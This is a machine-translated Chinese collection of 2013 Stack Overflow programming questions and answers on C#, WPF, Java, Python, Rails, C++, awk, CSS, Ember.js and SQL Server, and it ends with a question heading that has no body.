我们的数据库正在从 int 迁移到 bigint。在迁移的分区中，我在存储为 bigint 的表中有一个列名，在其他分区中，它存储为 int（要迁移）。想知道是否可以使用单个数据上下文来查询两个数据库。当我将 dbml 作为 bigint 并在已将列名定义为 int 的 db-> 表中进行查询时。我收到以下错误

指定的演员表无效。在 System.Data.SqlClient.SqlBuffer.get_Int64() 在 System.Data.SqlClient.SqlDataReader.GetInt64(Int32 i)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T23:03:02.397

您必须采取一种解决方法：正确声明所有表的真实数据类型。然后将它们转换为查询的一部分。例子：

```
tableBigint.Select(x => x.ID)
tableInt.Select(x => (long)x.ID) 
```

您现在可以合并它们（或任何您想对它们做的事情），因为类型匹配并且反序列化也有效。

# c# - 如何在单个窗口中显示多个用户控件？

> ID：15533270
> 
> 赞同：0
> 
> 时间：2013-03-20T19:46:31.730
> 
> 标签：c#, wpf, mvvm, user-controls

我想做的很简单，但我可能会以错误的方式去做。我本质上想要一种在同一个窗口中显示不同视图的方法。我现在可以使用的一个例子是：

```
<Window x:Class="MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Title="MainWindow" Height="800" Width="800"
        DataContext="{Binding Source={StaticResource Locator}, Path=MainPageViewModel}">
    <Grid>
        <ContentPresenter Content="{Binding SelectedView}"/>
    </Grid>
</Window> 
```

有了上面的内容，我现在可以通过在 SelectedView 中将它设置为不同的东西来更改 UserControl。但是，我认为这可能违反了 MVVM。既然您已经知道我要做什么，请推荐一种更好的方法（如果存在）。我只是想在应用程序中创建不同的视图，而不必产生更多的窗口等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:41:50.897

MVVM 可能会也可能不会。MVVM 您将 ViewModel 设置为您的代码，然后创建一个资源库来告诉视图它与视图模型相关。你所做的只是一个绑定。如果您在“MainWindow”后面的代码中执行所有代码，那么这几乎是违反 MVVM 的。

您还可以创建一些视图，然后在不同的 DOCKING PANELS 中显示它们。我只是在开始使用 MVVM 之前才这样做，并且一次只显示一个，但我认为您可以更轻松地做到这一点。

XAML：

```
<DockPanel x:Name="MainDock" LastChildFill="True">
        <StackPanel DockPanel.Dock="Top">
            <StackPanel.Background>
                <LinearGradientBrush EndPoint="0.5,1" StartPoint="0.5,0">
                    <GradientStop Color="Black" Offset="0" />
                    <GradientStop Color="#FF759FCB" Offset="1" />
                </LinearGradientBrush>
            </StackPanel.Background>

                <Menu Background="Transparent" >
                    <Menu.ItemsPanel>
                        <ItemsPanelTemplate>
                            <UniformGrid Rows="1"/>
                        </ItemsPanelTemplate>
                    </Menu.ItemsPanel>
                    <MenuItem Grid.Column="0" x:Name="mnuBasic" Header="Basic Batch" Click="mnuBasic_Click" />
                    <MenuItem Grid.Column="1" x:Name="mnuImages" Header="Image List" Click="mnuFENSImages_Click" />
                    <MenuItem Grid.Column="2" x:Name="mnuReRender" Header="ReRender Batch" Click="mnuReRender_Click"/>
                </Menu>
        </StackPanel>

        <DockPanel x:Name="dockcontent" DockPanel.Dock="Right" />
    </DockPanel> 
```

然后，我将使用单击菜单项的数据填充名为“dockcontent”的部分。填充对接的代码示例：

```
Exporter exp = new Exporter();  //constructor args if needed, this is a user control

dockcontent.Children.Clear();  // clear the dockpanel so nothing already exists
dockcontent.Children.Add(exp);  // populate the dock with my user control 
```

我认为您可以使用多种方法来制作多个图像。只要您的对象是正确上下文中的视图，您就可以直接在 XAML 中执行我期望的绑定。

请记住，后面的代码过多，基本上是根本不遵循 MVVM 的。由于 MVVM 的目的是将您的演示文稿与您的代码隔离开来，而不是将它们放在一起。

# android - 简单的 XML ElementListUnion - 不允许使用两个通用列表？

> ID：15533272
> 
> 赞同：3
> 
> 时间：2013-03-20T19:46:39.730
> 
> 标签：android, xml, list, unmarshalling, simple-framework

我正在尝试通过简单的框架反序列化 xml。我有两个列表，它们的类型仅在运行时才知道。所以我使用了@ElementListUnion。

```
Customer.java

@ElementListUnion({@ElementList(inline = true,type=Thing.class),@ElementList(inline = true,type=AnotherThing.class)})
List<Object> things;

@ElementListUnion({@ElementList(inline = true,type=Thing.class),@ElementList(inline = true,type=AnotherThing.class)})
List<Object> anotherthings ; 
```

但我得到以下异常

```
03-20 19:36:20.534: E/AndroidRuntime(2764): Caused by:  
 org.simpleframework.xml.core.PersistenceException: Duplicate annotation of name 
'thing' on @org.simpleframework.xml.ElementListUnion(value=
[@org.simpleframework.xml.ElementList(data=false, empty=true, entry=, inline=true,
  name=, 
required=true, type=class com.data.Thing),  
 @org.simpleframework.xml.ElementList(data=false,
 empty=true, entry=, inline=true, name=, required=true, type=class 
 com.data.AnotherThing)])
 on field 'things' java.util.List com.data.Customer.things 
```

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-25T22:20:23.443

您尚未为 设置值`entry`，因此 Simple 无法确定您使用的是哪个类。看这里：

```
@Root(name = "Customer")
public class Customer
{
    @ElementListUnion(
    {
        @ElementList(entry = "thingValue", inline = true, type = Thing.class),
        @ElementList(entry = "anotherThingValue", inline = true, type = AnotherThing.class)
    })
    List<Object> things;

    @ElementListUnion(
    {
        @ElementList(entry = "thingValue", inline = true, type = Thing.class),
        @ElementList(entry = "anotherThingValue", inline = true, type = AnotherThing.class)
    })
    List<Object> anotherthings;

} 
```

每个都`@ElementList`需要一个`entry`，这就是用于元素的标签：

```
<Customer>
   <thingValue>...<thingValue/>                 <!-- That's a 'Thing' -->
   <anotherThingValue>...<anotherThingValue/>   <!-- That's an 'AnotherThing' -->
</Customer> 
```

但是请确保您不要命名`entry`该类，因此`entry = "thing"`可能会失败。

# python - 输入字符串时数组输入第二个整数

> ID：15533273
> 
> 赞同：1
> 
> 时间：2013-03-20T19:46:41.637
> 
> 标签：python

当我在我的数组中插入一个字符串时，我期望发生的是它拒绝该字符串并给出一条消息，解释如何只允许在数组中使用整数。而是重复之前插入的整数。

```
import sys

ArrayWidth = 9

mmWidth = 22

ArrayDivider = '=' * 33
ArrayDivider = ArrayDivider.center(ArrayWidth)

mmDivider = '=' * 28
mmDivider = mmDivider.center(mmWidth)

MaxAndMin = 'Maximum & Minimum'
MaxAndMin = MaxAndMin.center(mmWidth)

Array = 'Array'
Array = Array.center(ArrayWidth)

Numbers = []

while True:
    NumberInput = input('Enter a whole number (Exit the loop by pressing "0"): ')
    try:
        NumberInput2 = int(NumberInput)
        if NumberInput2 == 0:
            break
        if NumberInput2 <= 0:
            print('Please enter a number greater then 0.');
            continue;
    except ValueError:
        print("Error. Non-numeric data was entered.")
    except:
        print("Error with input...")
    Numbers.append(NumberInput2)

print('\n'+ArrayDivider+Array+ArrayDivider)
print(sorted(Numbers, key=int),'\n')
print(mmDivider+MaxAndMin+mmDivider)
print('Maximum Number = {}'.format(max(Numbers)))
print('Minimum Number = {}'.format(min(Numbers))) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:49:29.767

`Numbers.append(NumberInput2)`无论是否引发异常，您都会这样做。当`int`raises时`ValueError`，`NumberInput2`不会重新分配并保留旧值。

尝试这个：

```
while True:
    NumberInput = input('Enter a whole number (Exit the loop by pressing "0"): ')
    try:
        NumberInput2 = int(NumberInput)
        if NumberInput2 == 0:
            break
        if NumberInput2 <= 0:
            print('Please enter a number greater then 0.');
            continue
        Numbers.append(NumberInput2)
    except ValueError:
        print("Error. Non-numeric data was entered.")
    except:
        print("Error with input...") 
```

或者，您可以`continue`在打印错误消息后，就像您对非肯定输入所做的那样。

# ruby - 为什么在这个简单的 Active Record 示例中没有保存 id？

> ID：15533280
> 
> 赞同：1
> 
> 时间：2013-03-20T19:46:52.340
> 
> 标签：ruby, ruby-on-rails-3, rails-activerecord

这是一个关于 Ruby on Rails 和 Active Record 的新手问题。我创建了一个 rails 应用程序、一个 sqlite 表和一个调用`Thing`以映射到表的模型类。然后我运行 rails 控制台，如下所示。为什么该`id`字段未正确保存？

```
irb(main):005:0> Thing.all
  Thing Load (0.2ms)  SELECT "things".* FROM "things"
=> []
irb(main):006:0> t = Thing.new :name => 'test'
=> #<Thing id: nil, name: "test", somedate: nil>
irb(main):007:0> t.id
=> nil
irb(main):009:0> t.save
   (0.2ms)  begin transaction
  SQL (3.4ms)  INSERT INTO "things" ("name", "somedate") VALUES (?, ?)  [["name", "test"], ["somedate", nil]]
   (0.8ms)  commit transaction
=> true
irb(main):010:0> Thing.all
  Thing Load (0.2ms)  SELECT "things".* FROM "things"
=> [#<Thing id: nil, name: "test", somedate: nil>]
irb(main):011:0> t.id
=> 1 
```

在sqlite中；

```
sqlite> .schema things
CREATE TABLE things (id int primary key, name text, somedate date); 
```

该模型：

```
class Thing < ActiveRecord::Base
  attr_accessible :name
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:57:06.957

这有点令人困惑。但我猜你的架构有问题。`id`您是否在迁移文件中明确定义了字段？

我这么说是因为，主字段也应该自动递增。以确保我刚刚签入我的电脑。对于一个表，我的架构是这样的：

```
CREATE TABLE "albums" ("id" INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, "user_id" integer,...... 
```

在这里，您可以看到与您的区别。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:04:17.653

我想你会发现，如果你运行`rake db:migrate`它，它会创建一个带有自动递增 id 列的 things 表。这将按您期望的方式工作。我不建议您手动创建表格。

# c++ - 是否可以声明属于模板类的单个实例化的函数？

> ID：15533285
> 
> 赞同：7
> 
> 时间：2013-03-20T19:47:22.120
> 
> 标签：c++, templates

我想到的应用程序类似于一个`Vector<size>`类，我希望在其中声明

```
CrossProduct(const Vector<size>& other) 
```

仅适用于大小为 3 的情况。我知道有办法绕过它...

*   仅包含 size=3 的函数定义
*   让所有其他尺寸产生链接器错误
*   在方法的开头做一个静态断言来检查大小是否为 3

有没有办法正确地只为特定实例声明成员函数？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T19:57:07.613

这是一种方法：

```
template <class Type, size_t Size>
struct EnableCrossProduct
{

};

template <class Type>
struct EnableCrossProduct<Type, 3>
{
  void CrossProduct(const Type & other){}
};

template <size_t Size>
struct Vector : public EnableCrossProduct<Vector<Size>, Size>
{
}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T19:54:37.007

如果您可以在编译时获取大小信息，则可以使用 std::enable_if。

```
template<int N>
struct Vector
{
    static const int size = N;
    double data[N];
    // ...

    template<class V>
    double CrossProduct( const V& other, 
        typename std::enable_if< size == 3 && V::size == 3 >::type* = 0) const
    {
        // ...
        return 0;
    }
};

void foo( const Vector<3>& v3, const Vector<4>& v4 )
{
    v3.CrossProduct( v3 ); // Ok
    v3.CrossProduct( v4 ); // Compile-time error
} 
```

您可能只想在 enable_if 中设置该条件`size == V::size`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T19:55:56.007

我更喜欢这种`static_assert`方法。这

*   导致最清晰的错误信息
*   是合适的，因为不需要 SFINAE
*   是最简单的方法。

# java - 这是一个 8 路洪水填充程序吗？

> ID：15533287
> 
> 赞同：0
> 
> 时间：2013-03-20T19:47:28.120
> 
> 标签：java, algorithm, flood-fill

嘿，这可以正常工作，但是在将其与 4-way 进行比较后，我找不到任何差异...如果我将其交出，它会被认为是实现 8-way flood 算法的正确方法吗？一个是/否的答案就足够了，但我想在继续之前我会问专家

```
private void flood8(int col, int row, Color startColour) {

    if (startColour.equals(getPixel(col, row))) {
        setPixel(col, row);

        // this bit makes the animation work by
        // drawing intermediate results, and slowing the updates down
        synchronized (this) {
            draw();
       }

        try {
            Thread.sleep(10);
        } catch (InterruptedException e) {
        }

        // now we call the routine recursively for each neighbour
        // the "guard" surrounding each call ensures that we do
        // not try to keep going past the edge of the raster
        if (col + 1 < COLS) {
            flood4(col + 1, row, startColour);
            System.out.println("Position1 " + col + ", " + row );
        }
        if (col - 1 >= 0) {
            flood4(col - 1, row, startColour);
            System.out.println("Position2 " + col + ", " + row );
        }
        if (row + 1 < ROWS) {
            flood4(col, row + 1, startColour);
            System.out.println("Position3 " + col + ", " + row );
        }
        if (row - 1 <= 0) {
            flood4(col, row - 1, startColour);
            System.out.println("Position4 " + col + ", " + row );
        }
        if (col + 1 < COLS && row + 1 < ROWS) {
            flood4(col + 1, row, startColour);
            System.out.println("Position1 " + col + ", " + row );
        }
        if (col + 1 < COLS && row - 1 >= 0) {
            flood4(col - 1, row, startColour);
            System.out.println("Position2 " + col + ", " + row );
        }
        if (row - 1 >= 0 && row + 1 < ROWS) {
            flood4(col, row + 1, startColour);
            System.out.println("Position3 " + col + ", " + row );
        }
        if (row - 1 >= 0 && row - 1 >= 0) {
            flood4(col, row - 1, startColour);
            System.out.println("Position4 " + col + ", " + row );            
        }
    }
} 
```

谢谢阅读

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T22:10:55.963

*将几条评论变成一个答案，以将其从“未答复”队列中取出。社区 wiki，因此请随时添加。*

> 它会被认为是实现 8 路洪水算法的正确方法吗？

可能不会，原因如下：

*   您调用`flood4`，而适当的递归应该`flood8`再次调用。
*   您对对角线邻居进行边界检查，但（可能）递归调用仅更改一个坐标。

# java - 错误：jar 内的 JUnit 命令行测试类

> ID：15533295
> 
> 赞同：3
> 
> 时间：2013-03-20T19:48:09.110
> 
> 标签：java, unit-testing, junit, junit4

我已经搜索了这个问题，但我发现的只是如何在单个文件上从命令行运行 JUnit。

我有一个使用 maven 创建的小型 Javaproject。这个项目有我的 JUnit 测试类、套件和测试运行器。

我使用 maven 编译了项目，得到了一个名为 .jar 的项目的 jar 文件`cs.jar`。

当我从 eclipse 或 maven 命令行使用 maven 时，测试运行良好。

现在我必须把它传递`cs.jar`给我的同事，他的机器上没有 maven，所以我想我会把`junit.jar`和我的发送给他，`cs.jar`这样他就可以运行测试用例并查看结果。

他使用 Windows 机器，我向他发送了使用以下语法从命令行运行 JUnit 的指令：

```
java -cp cs.jar;junit.jar;hamcrest-core.jar org.runner.JUnitCore com.abc.cs.test.run.CSTestRunner 
```

但是我收到了消息-

```
JUnit version 4.11
Could not find class: com.abc.cs.test.run.CSTestRunner 
```

任何想法我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T10:47:03.713

*当您使用 Maven 构建项目时，从打包的 jar 中排除测试类*就足够了。这是正常的行为，很好；您在构建时进行测试，然后获得一个不错的轻量级 jar。

如果你想用你的 jar 打包你的测试类（不推荐用于生产），你可以看到[Maven 的解决方案](http://maven.apache.org/plugins/maven-jar-plugin/usage.html#How_to_create_a_jar_containing_test_classes)。

然而，真正的解决方案是让你的伙伴加入 Maven 潮流；）

# css - LessCSS：不要为注释添加换行符

> ID：15533298
> 
> 赞同：1
> 
> 时间：2013-03-20T19:48:11.983
> 
> 标签：css, less

Mac 上是否有保留“内联”注释（不缩小）的 Less 预处理器？我有一个用于从同一个文件创建不同 CSS 主题的脚本，它依赖于内联注释来切换规则：

```
.what {
    width: 200px; /* what-width */
} 
```

我使用的所有 Less 预处理器都将其变成：

```
.what {
    width: 200px; 
    /* what-width */
} 
```

...这是不太可取的。任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:00:16.273

目前我所知道的最好的是将注释放在分号*之前*，但这可能需要更改您的脚本（而且看起来仍然不太好）：

**LESS 和 CSS 输出是**

```
.what {
    width: 200px /* what-width */;
} 
```

# bash - 用于查找数据文件中最大和最小数字的脚本

> ID：15533302
> 
> 赞同：2
> 
> 时间：2013-03-20T19:48:35.130
> 
> 标签：bash, sed, awk

假设有一个数据文件`data.txt`，其内容如下：

```
176.05 174.66 169.81 143.48 188.23 186.74 135.95 181.69 162.19 96.84 205.55 
```

输出将类似于：

```
min: 96.84
max: 205.55 
```

任何简单的脚本都可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:54:03.150

如果你有 GNU awk：

```
awk '{a[NR]=$1}END{asort(a);print "min: ",a[1],"\nmax: "a[NR]}' RS=' ' file
min:  96.84 
max: 205.55 
```

如果您不这样做：

```
awk '{x=$1>x?$1:x;m=$1<m?$1:m}END{print "min: ",m,"\nmax: ",x}' RS=' ' m=inf x=-m file
min:  96.84 
max:  205.55 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:56:40.990

一个简单的 awk 解决方案

```
awk 'NR==1{max=min=$1;}{for(i=1;i<=NF;i++){max=max<$i?$i:max;min=min>$i?$i:min;}}END{print "max:",max,"\nmin:",min;}' data.txt 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T19:57:27.300

这是一个执行此操作的 AWK 脚本。我删除了空格以在一行中放置更多空间，如果需要，可以将其隔开。

```
awk '{min=$1;max=$1;for(i=2;i<=NF;i++){if($i>max)max=$i;if($i<min)min=$i}print "min:",min,", max:",max}' data.txt 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:05:04.493

正如您现在所知道的，`awk`它是完成这项工作的好工具。这是一个更改记录分隔符以将每个数字视为输入中的单独记录的变体：

```
awk '{max=($1>max)?$1:max;
      min=($1<min)?$1:min;
     }
     END{printf "min: %s\nmax: %s\n",min,max}' \
   RS=" "  min=inf max=-inf file.txt 
```

# c# - 在 C# 中更改制表符分隔文件的“长度”？

> ID：15533303
> 
> 赞同：0
> 
> 时间：2013-03-20T19:48:36.283
> 
> 标签：c#

我有一个制表符分隔的文件，所以我正在读入一个数组：

```
string[] yourChoicesItems = File.ReadAllLines("test.txt"); 
aaaaaaaaa(tab)0.09
aaa(tab)1.25 
```

问题是，当我在文本框中显示数组时，它最终看起来像这样：

```
aaaaaaaaa    0.09
aaa    0.09 
```

我希望第二列排队。在 Word 中，我只是更改制表位，但是当我用 Google 搜索“制表位”+ C# 时，我得到了完全不同的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T19:51:40.100

从根本上说，据我所知，文本框并不是真正设计用于处理格式化文本。当然有`RichTextBox`——但我不确定这是否会按照您希望它默认的方式处理选项卡。

使用纯文本框，您*可以*将字体设置为固定宽度，然后将每个选项卡替换为不同数量的空格，具体取决于它在行中的距离......但是从根本上显示表格有很多麻烦控件中的数据确实不是为此目的而设计的。

相反，您应该考虑沿网格视图的线进行的一些事情 - 用制表符分割线，每条线都变成一行数据。我怀疑，对于手头的任务来说，这是一个更合适的控制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:59:03.083

要将它们排列在您的文本框中，请拆分您的输入，然后使用 String.Format 将其加入：

```
string[] parts= record.Split('\t');
string yourOutput = string.Format("{0,-15}{1}", parts[0], parts[1]); 
```

当然，一些输入检查会很好......你所要求的仍然可能需要修改，并且对你展示的每个部分都有单独的控制

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T19:52:55.760

```
string[] records = inputString.Split('\n');
foreach(var record in records)
{
   string[] fields = record.Split('\t');
   // do stuff with the fields, here, (independently of tabs) 
} 
```

**编辑**@JonSkeet 比我快 30 秒，但我要留下这个代码示例 b/c 他的答案缺少一个

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T19:52:58.500

看看[这个](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/0d267009-5480-4314-8929-d4f8d8687cfd)答案。您尚未指定您使用的是 wpf 还是 wf，但它应该是类似的。

# java - RXTX 无法在 ubuntu 上列出端口

> ID：15533310
> 
> 赞同：1
> 
> 时间：2013-03-20T19:49:10.013
> 
> 标签：java, ubuntu, serial-port, rxtx

我正在尝试运行简单的代码：

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import gnu.io.CommPortIdentifier; 
import gnu.io.SerialPort;
import gnu.io.SerialPortEvent; 
import gnu.io.SerialPortEventListener; 
import java.util.Enumeration;

public class SerialTest implements SerialPortEventListener {
SerialPort serialPort;
private BufferedReader input;
private OutputStream output;
private static final int TIME_OUT = 2000;
private static final int DATA_RATE = 9600;

public void initialize() {
CommPortIdentifier portId = null;
Enumeration portEnum = CommPortIdentifier.getPortIdentifiers();
while (portEnum.hasMoreElements()) {
CommPortIdentifier currPortId = (CommPortIdentifier) portEnum.nextElement();
System.out.println( "a " + currPortId.getName());
}
}

public synchronized void close() {
//...
}

public synchronized void serialEvent(SerialPortEvent oEvent) {
// ...
}

public static void main(String[] args) throws Exception {
SerialTest main = new SerialTest();
main.initialize();
}
} 
```

它应该列出我系统中可用的 COM 端口。我正在研究 3.2.0-39-generic #62-Ubuntu x86_64 x86_64 x86_64 GNU/Linux 和 Java 1.6

首先，我从 apt-get 存储库安装了 RXTX，但在遇到一些麻烦后，我从源代码安装它，但它仍然无法正常工作。我在所有 ttyS* 上都设置了 chmod 777 以确保这与权限无关。
我试试[这个](https://stackoverflow.com/questions/10620691/rxtx-not-working-in-ubuntu)并没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T23:51:32.677

您还需要在类路径中包含 .so 文件。

[您可以从http://rxtx.qbang.org/wiki/index.php/Download](http://rxtx.qbang.org/wiki/index.php/Download)下载预构建的二进制文件，遗憾的是它们仅提供 32 位版本。

如果您使用 Eclipse，您只需将 .so 文件放在项目的根目录中，它应该可以工作。如果这不起作用，您可以尝试设置 java.library.path VM 参数。[如何从 Eclipse 中设置 java.library.path](https://stackoverflow.com/questions/957700/how-to-set-the-java-library-path-from-eclipse)中提供了相关说明

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-13T13:41:07.210

我找到了 64 位版本的[`librxtxSerial.so library`](http://mirror.transact.net.au/pub/sourceforge/c/project/ca/capcode/capcode/patches/RXTXSerial64/linux/). 我已经对其进行了测试，并且可以正常工作。

下载此文件并将其复制到`/usr/lib folder`

# html - 骨架网格系统：使容器 100%

> ID：15533311
> 
> 赞同：5
> 
> 时间：2013-03-20T19:49:12.767
> 
> 标签：html, css, skeleton-css-boilerplate, grid-system

是否可以使根 div（容器）成为文档的 100%？
这是我的代码：

```
<div class="container" style="width:100%;">
    <div id="topbar" class="sixteen columns" style="background-color:green;">topbar topbar topbar topbar topbar topbar </div>
</div> 
```

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2016-08-25T02:18:04.823

我知道这个问题是很久以前问过的，但 Skeleton 有这方面的实用程序类。

基本上将`.u-full-width`and`.u-max-full-width`类添加到任何`<div>`with class `.container`。

只需确保它位于`<div>`带有 class 的元素上`.container`，因为它似乎不适用于`<div>`带有`.row`or`.column`类的元素。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-20T19:56:19.197

您需要创建自己的容器类。我不知道骨架响应平台的 css 在我脑海中是什么样子的。我使用一个叫做 Columnal 的，我知道它是相似的，所以它应该是这样的......

```
.full-width-container {
width: 100%;
max-width: 100%;
clear: both;
margin: 0 auto;
} 
```

正常的CSS应该是这样的`.container { max-width: 1140px; width: 100%; clear: both; margin: 0 auto; }`

# ember.js - Ember 应用程序中的外部车把模板

> ID：15533324
> 
> 赞同：1
> 
> 时间：2013-03-20T19:50:17.240
> 
> 标签：ember.js, handlebars.js

我有以下代码

```
 Todos = Ember.Application.create();

    Todos.Todo = Ember.Object.extend({
        title: null,
        isDone: false
    });

    Todos.TodosController = Ember.Object.extend({
        // We need an array to hold our Todo objects
        todos: Ember.A(),

        init: function(){
            debugger;
            var items = this.get('todos');
            items.addObject(Todos.Todo.create({title: "This is an Ember Item"}));
            items.addObject(Todos.Todo.create({title: "This is another Ember Item"}));
        },

        remainingCount: function(){
            return this.get('todos').filterProperty('isDone', false).length;
        }.property('todos.@each.isDone')

    });

    Todos.controller = Todos.TodosController.create();

    Todos.TodoView = Ember.View.extend({
        templateName: 'todos'
    });

</script> 
```

我在 thml 中定义了以下车把挂钩。但由于某种原因，模板没有被渲染。当我检查时，`Handlebars.templates`我看到返回的对象中列出了待办事项。我在这里想念什么。

![在此处输入图像描述](../Images/a97b2b569af15e39641e27f60ad26135.png)

**编辑**

是否可以在 .handlebars 文件中定义模板？

**编辑**

我在 app.js 中做了这个。

```
$.extend(Ember.TEMPLATES, Ember.TEMPLATES, Ember.Handlebars.templates); 
```

但这似乎也无济于事。如下图所示，模板现在列在`Ember.TEMPLATES`. 但由于某种原因，它没有接他们。

![在此处输入图像描述](../Images/a67e21ae9ff484e150e5469f5d6f2858.png)

另外我在body标签之间没有任何html。我不确定我是否应该在那里有任何东西。

`<body></body>`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-11T17:48:44.767

[已经在这里](https://stackoverflow.com/questions/9860512/emberjs-handlebars-precompiling/12433660#12433660)回答了

要预编译车把模板，您必须安装[ember-precompile 包](https://github.com/gabrielgrant/node-ember-precompile)

如果您需要 make 实用程序（在 Mac 上）[安装它](https://stackoverflow.com/questions/11570034/issue-installing-jsdom-on-mac/11593832#11593832)

然后将预编译的模板包含到您的 index.html 中，如下所示：

```
 <script type="text/javascript">
        App = Ember.Application.create({});
    </script>
    <!-- templates -->
    <script src="js/templates/templates.js"></script>
    <!-- app init -->
    <script type="text/javascript">
        App.initialize();
    </script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:30:10.040

@MilkyWayJoe

你所说的关于应用程序模板的内容对我有帮助，谢谢。我认为我的预编译器是导致我出现问题的原因。我现在可以在应用程序模板中查看我的部分内容。但是，由于`linkTo`某种原因，它似乎不起作用。`linkTo`如果我在 html 页面中声明模板，则有效！

这是上下文中的预编译器。 [http://blog.selvakn.in/2012/05/precompiling-handlerbars-tempates-with.html](http://blog.selvakn.in/2012/05/precompiling-handlerbars-tempates-with.html)

我现在可以查看文件了。但是，需要添加以下几行`app.js`才能使其正常工作。

```
// To register partials
$.each(Ember.Handlebars.templates, function(i, template){
    if(i.indexOf('_') === 0){
        Ember.Handlebars.partials[i.substring(1, i.length)]  = template;
    }
});

// To let Ember.Handlebars know about the newly added templates
$.extend(Ember.TEMPLATES, Ember.TEMPLATES, Ember.Handlebars.templates); 
```

帮助我的是首先将模板一次添加到 html 正文中，然后将它们移动到自己的文件中。另请记住，这`data-template-name`不是您可以忽略的属性。如果一个人这样做，它会导致各种各样的问题。

**编辑**

这个节点包效果更好。

[Emberjs Handlebars 预编译](https://stackoverflow.com/questions/9860512/emberjs-handlebars-precompiling)

# python - python tkinter spinbox和optionmenu之间的区别

> ID：15533328
> 
> 赞同：2
> 
> 时间：2013-03-20T19:50:31.797
> 
> 标签：python, user-interface, listbox, tkinter, optionmenu

我只是想知道旋转框和选项菜单之间的区别是什么？它们似乎都是一个下拉列表，显示不同的选项。我是编程的初学者，所以如果有人可以在不涉及太多技术细节的情况下进行解释，我将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:52:50.777

引自[developer.gnome.org](https://developer.gnome.org/hig-book/2.91/controls-spin-boxes.html.en) ...

> 仅将旋转框用于数字输入。当您需要用户从其他类型的固定数据集中进行选择时，请使用列表或选项菜单。

# java - 使用 wifi 或 lan 集中数据库，使用前端作为 java(swing) n 后端作为 oracle 10g

> ID：15533331
> 
> 赞同：-2
> 
> 时间：2013-03-20T19:50:50.150
> 
> 标签：java, swing, oracle10g, wifi

我已经在java（Swing）中开发了桌面应用程序并且我使用了oracle 10g数据库所以如何在wifi中使用该软件意味着在lappy＃1内容数据库和lappy＃2内容只有jar文件和jdk，当lappy＃2保存一些数据那么这个数据应该保存在 lappy #1 数据库中......请大家帮我解决这个问题..提前谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T07:18:27.967

我想您已经描述了一台带有桌面应用程序（Java）和本地数据库（db1）的笔记本电脑（lappy？）。您有第二台带有本地数据库 (db2) 的笔记本电脑。您希望在 db2 中反映对 db1 所做的更改。

如果 db2 是只读数据库，那么复制是一个简单的解决方案，将在数据库层进行配置。如果 db2 也可以写入，那么您可能需要考虑循环复制，如果您需要在 db1 中反映这些更改。

由于您的设置是联网的，因此您可以拥有一个数据库服务器并让笔记本电脑使用它。这将消除同步的需要。如果您需要离线使用数据，那么这不是一个选择。

在这种情况下，我认为客户端是 Java 应用程序并且您的网络是无线的并不重要。

# sql-server - 通过 C# 代码插入时响应缓慢

> ID：15533332
> 
> 赞同：0
> 
> 时间：2013-03-20T19:50:50.030
> 
> 标签：sql-server, .net-4.0, sql-server-2008-r2

我的软件需要很长时间才能将大约 2500 行添加到 SQL Server 2008 R2 中，但我在 2005 年遇到了同样的问题。

我没有使用事务，我不需要太多的性能，但我不明白为什么时间执行不是恒定的。

每个插入都会创建新的`SqlCommand`and `SqlConnection`，池化设置为 true。

通常插入需要 3/4 毫秒……但每插入 3/4 次我就有 200 毫秒的执行时间！！！

这意味着我需要更多的 200 毫秒来插入 3 或 4 行。

我正在使用 sql native 客户端从另一台电脑通过网络工作，在本地机器上运行相同的应用程序，它的工作速度要快得多。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T17:22:44.567

使用批量插入

我不确定您是否使用 MS Enterprise Libraries，您可以执行以下操作：

```
using (DbConnection connection = db.CreateConnection())
{
     connection.Open();
     DbTransaction transaction = connection.BeginTransaction();

     try
     {

          // insert a bunch of rows here. You could try to insert all 2500, but that leaves your transaction open for the whole duration. Or you could break it into 100 inserts. Test it out to see what suits your application better.
          transaction.Commit();
     }
     catch (Exception ex)
     {
          transaction.Rollback();
     }
     connection.Close();
} 
```

要点是，如果您对一堆插入使用相同的事务而不是每次插入一个事务，那么您将更少地写入日志，从而使其更快。

# javascript - 将 Html 表导出到 Excel 文件 - 格式不正确

> ID：15533334
> 
> 赞同：0
> 
> 时间：2013-03-20T19:50:54.773
> 
> 标签：javascript, jsp, html-table, export-to-excel

